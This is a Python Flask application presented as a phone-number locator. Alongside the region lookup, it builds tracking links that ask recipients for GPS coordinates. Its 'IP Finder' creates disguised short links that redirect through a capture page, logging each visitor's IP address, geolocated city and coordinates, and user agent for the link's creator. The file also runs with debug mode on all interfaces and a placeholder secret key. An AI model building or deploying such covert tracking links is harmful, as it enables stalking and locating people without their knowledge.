from flask import Flask, render_template, request, flash, redirect, url_for
import phonenumbers
from phonenumbers import geocoder, carrier, PhoneNumberFormat
import folium
import os
import sys
import csv
import pycountry
from geopy.geocoders import Nominatim
import secrets
import time
import requests
import ipaddress
from datetime import datetime

# Load India prefix->circle mapping (if available)
INDIA_PREFIX_CIRCLES = {}
DATA_PATH = os.path.join(os.path.dirname(__file__), 'data', 'india_mobile_prefixes.csv')
if os.path.exists(DATA_PATH):
    try:
        with open(DATA_PATH, newline='', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                p = row.get('prefix', '').strip()
                c = row.get('circle', '').strip()
                if p and c:
                    INDIA_PREFIX_CIRCLES[p] = c
    except Exception as _:
        INDIA_PREFIX_CIRCLES = {}

def get_india_circle(national_number: str):
    # Try longest prefixes first (supports 6..3 digits)
    s = str(national_number)
    for length in (6, 5, 4, 3):
        if len(s) >= length:
            pref = s[:length]
            if pref in INDIA_PREFIX_CIRCLES:
                return INDIA_PREFIX_CIRCLES[pref]
    return None

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Required for flash messages

# In-memory live location store: { token: {"lat": float, "lng": float, "ts": epoch} }
LIVE_LOCATIONS = {}

# ---------------------- IP Finder (short link) ----------------------
# Structure: IP_TRACKS[token] = {"target": str, "hits": [{"ip": str, "city": str, "region": str, "country": str, "lat": float, "lon": float, "ts": epoch, "ua": str}]}
IP_TRACKS = {}

def get_client_ip(req: request) -> str:
    # Test override: /r/<token>?ip=8.8.8.8
    qp = req.args.get('ip')
    if qp:
        return qp.strip()
    # Common proxy/CDN headers
    for h in ('CF-Connecting-IP', 'X-Real-IP', 'X-Client-IP', 'X-Forwarded-For'):
        v = req.headers.get(h)
        if v:
            # X-Forwarded-For may have multiple IPs
            return v.split(',')[0].strip()
    return req.remote_addr or ''

def is_public_ip(ip: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip)
        return not (ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local)
    except Exception:
        return False

def _log_ip_hit(token: str, ip: str, ua: str):
    """Lookup geo for given IP and append a hit into IP_TRACKS[token]."""
    data = IP_TRACKS.get(token)
    if not data:
        return
    city = region = country = ''
    lat = lon = None
    note = ''
    try:
        if ip and is_public_ip(ip):
            resp = requests.get(f'http://ip-api.com/json/{ip}', params={'fields': 'status,country,regionName,city,lat,lon,query'}, timeout=5)
            j = resp.json() if resp.ok else {}
            if j.get('status') == 'success':
                country = j.get('country', '')
                region = j.get('regionName', '')
                city = j.get('city', '')
                lat = j.get('lat')
                lon = j.get('lon')
            else:
                note = 'Geolocation lookup failed.'
        else:
            note = 'Local/private IP — approximate location unavailable.'
    except Exception:
        pass
    try:
        data['hits'].append({
            'ip': ip,
            'city': city,
            'region': region,
            'country': country,
            'lat': lat,
            'lon': lon,
            'ts': time.time(),
            'ua': ua,
            'note': note,
        })
    except Exception:
        pass

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_number = request.form.get('phone_number', '').strip()
        
        # Normalize input: keep digits and '+', convert leading '00' to '+'
        normalized = ''.join(ch for ch in phone_number if ch.isdigit() or ch == '+')
        if normalized.startswith('00'):
            normalized = '+' + normalized[2:]
        
        if not phone_number:
            flash('Please enter a phone number', 'error')
            return redirect(url_for('index'))
            
        try:
            # Parse the phone number
            default_region = 'BD'  # Fallback region when '+' not provided
            region = None if normalized.startswith('+') else default_region
            parsed_number = phonenumbers.parse(normalized, region)
            
            # Basic validation
            if not phonenumbers.is_valid_number(parsed_number):
                flash('Invalid phone number. Please include country code (e.g., +880 for Bangladesh)', 'error')
                return redirect(url_for('index'))
            
            # Get country code and national number
            country_code = parsed_number.country_code
            national_number = parsed_number.national_number
            
            # Get location (country/region)
            try:
                region_code = phonenumbers.region_code_for_country_code(country_code)
                location = geocoder.description_for_number(parsed_number, "en") or f"Country Code: +{country_code}"
            except:
                location = f"Country Code: +{country_code}"
            
            # Get service provider if available
            try:
                service_provider = carrier.name_for_number(parsed_number, "en") or "Unknown Carrier"
            except:
                service_provider = "Unknown Carrier"
            
            # Determine coordinates by geocoding the best available place string
            geolocator = Nominatim(user_agent="phone_locator_app")
            zoom = 5
            coordinates = None
            derived_circle = None
            try:
                # Country name from code
                region_code = phonenumbers.region_code_for_country_code(country_code)
                country = pycountry.countries.get(alpha_2=region_code)
                country_name = country.name if country else f"+{country_code}"

                # Try detailed location first (e.g., state/city for some countries)
                query = None
                # For India, try circle from prefix database first
                if country_code == 91 and national_number:
                    derived_circle = get_india_circle(str(national_number))
                    if derived_circle:
                        query = f"{derived_circle}, India"
                # If no circle or not India, try phonenumbers description
                if not query and location and location.strip() and location.strip().lower() not in {"unknown", ""}:
                    query = f"{location}, {country_name}"

                if query:
                    loc = geolocator.geocode(query, exactly_one=True, timeout=10)
                    if loc:
                        coordinates = {'lat': loc.latitude, 'lng': loc.longitude}
                        zoom = 9

                # Fallback to country centroid
                if coordinates is None and country_name:
                    loc = geolocator.geocode(country_name, exactly_one=True, timeout=10)
                    if loc:
                        coordinates = {'lat': loc.latitude, 'lng': loc.longitude}
                        zoom = 5

            except Exception as _:
                pass

            # Final fallback: Dhaka center
            if coordinates is None:
                coordinates = {'lat': 23.8103, 'lng': 90.4125}
                zoom = 5
            
            # Format number for display
            phone_display = phonenumbers.format_number(parsed_number, PhoneNumberFormat.INTERNATIONAL)

            # Create a simple map
            m = folium.Map(location=[coordinates['lat'], coordinates['lng']], zoom_start=zoom)
            folium.Marker(
                [coordinates['lat'], coordinates['lng']],
                popup=f"{phone_display}\n{location}",
                icon=folium.Icon(color='red')
            ).add_to(m)
            
            # Save the map to the static directory so it can be embedded via iframe
            os.makedirs('static', exist_ok=True)
            map_path = os.path.join('static', 'map.html')
            m.save(map_path)
            
            # Generate shareable live tracking links
            token = secrets.token_urlsafe(8)
            share_url = url_for('share_location', token=token, _external=True)
            live_url = url_for('live_view', token=token, _external=True)

            return render_template('result.html',
                                phone_number=phone_display,
                                location=location,
                                service_provider=service_provider,
                                country_code=country_code,
                                national_number=national_number,
                                derived_circle=derived_circle,
                                share_url=share_url,
                                live_url=live_url,
                                lat=coordinates['lat'],
                                lng=coordinates['lng'],
                                token=token)
            
        except Exception as e:
            print(f"Error: {str(e)}", file=sys.stderr)
            flash(f'Error processing phone number: {str(e)}', 'error')
            return redirect(url_for('index'))
    
    return render_template('index.html')

# ---------------------- Live location endpoints ----------------------

@app.route('/share/<token>')
def share_location(token):
    # Page that asks user to share GPS and posts it back
    return render_template('share.html', token=token)


@app.route('/live/<token>')
def live_view(token):
    # Viewer page that polls for latest location and shows on a map
    return render_template('live.html', token=token)


@app.route('/api/loc/<token>', methods=['GET', 'POST'])
def api_location(token):
    if request.method == 'POST':
        try:
            data = request.get_json(force=True, silent=True) or {}
            lat = float(data.get('lat'))
            lng = float(data.get('lng'))
            LIVE_LOCATIONS[token] = {"lat": lat, "lng": lng, "ts": time.time()}
            return {"ok": True}
        except Exception as _:
            return {"ok": False, "error": "invalid_payload"}, 400
    else:
        loc = LIVE_LOCATIONS.get(token)
        if not loc:
            return {"ok": True, "loc": None}
        return {"ok": True, "loc": loc}

# ---------------------- IP Finder endpoints ----------------------

@app.route('/ip', methods=['GET', 'POST'])
def ip_finder():
    if request.method == 'POST':
        target = request.form.get('target_url', '').strip()
        if not target:
            flash('Please provide a URL to redirect to.', 'error')
            return redirect(url_for('ip_finder'))
        # Basic normalization: ensure scheme
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        token = secrets.token_urlsafe(6)
        IP_TRACKS[token] = {"target": target, "hits": []}
        share_link = url_for('ip_redirect', token=token, _external=True)
        view_link = url_for('ip_view', token=token, _external=True)
        return render_template('ip_finder.html', share_link=share_link, view_link=view_link, target_url=target)
    # GET form only
    return render_template('ip_finder.html')


@app.route('/r/<token>')
def ip_redirect(token):
    data = IP_TRACKS.get(token)
    target = data['target'] if data else url_for('index', _external=True)
    # If testing override provided (?ip=), log immediately server-side and redirect
    override_ip = request.args.get('ip')
    if override_ip and data is not None:
        ua = request.headers.get('User-Agent', '')
        _log_ip_hit(token, override_ip.strip(), ua)
        return redirect(target)
    # Otherwise render interstitial capture page that fetches public IP client-side
    post_url = url_for('ip_log', token=token)
    return render_template('capture_ip.html', post_url=post_url, target_url=target)


@app.route('/ip/log/<token>', methods=['POST'])
def ip_log(token):
    data = IP_TRACKS.get(token)
    if not data:
        return {'ok': False, 'error': 'invalid_token'}, 400
    try:
        payload = request.get_json(force=True, silent=True) or {}
        ip = (payload.get('ip') or '').strip()
        if not ip:
            # Fallback to server-detected client IP if client couldn't fetch
            ip = get_client_ip(request)
        ua = request.headers.get('User-Agent', '')
        _log_ip_hit(token, ip, ua)
        return {'ok': True}
    except Exception as _:
        return {'ok': False, 'error': 'bad_request'}, 400


@app.route('/ip/view/<token>')
def ip_view(token):
    data = IP_TRACKS.get(token)
    if not data:
        flash('Invalid or expired token.', 'error')
        return redirect(url_for('ip_finder'))
    # Prepare rows with formatted time
    rows = []
    for h in data['hits']:
        rows.append({
            **h,
            'time_str': datetime.fromtimestamp(h['ts']).strftime('%Y-%m-%d %H:%M:%S')
        })
    # Find latest hit with coordinates
    latest_loc = None
    for h in reversed(data['hits']):
        if h.get('lat') is not None and h.get('lon') is not None:
            latest_loc = {
                'ip': h.get('ip'),
                'city': h.get('city'),
                'region': h.get('region'),
                'country': h.get('country'),
                'lat': h.get('lat'),
                'lon': h.get('lon'),
                'time_str': datetime.fromtimestamp(h['ts']).strftime('%Y-%m-%d %H:%M:%S')
            }
            break
    share_link = url_for('ip_redirect', token=token, _external=True)
    return render_template('ip_view.html', target_url=data['target'], hits=rows, share_link=share_link, latest_loc=latest_loc)

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    # Bind to all interfaces so phones on same Wi‑Fi can open the share/live links
    app.run(debug=True, host='0.0.0.0')
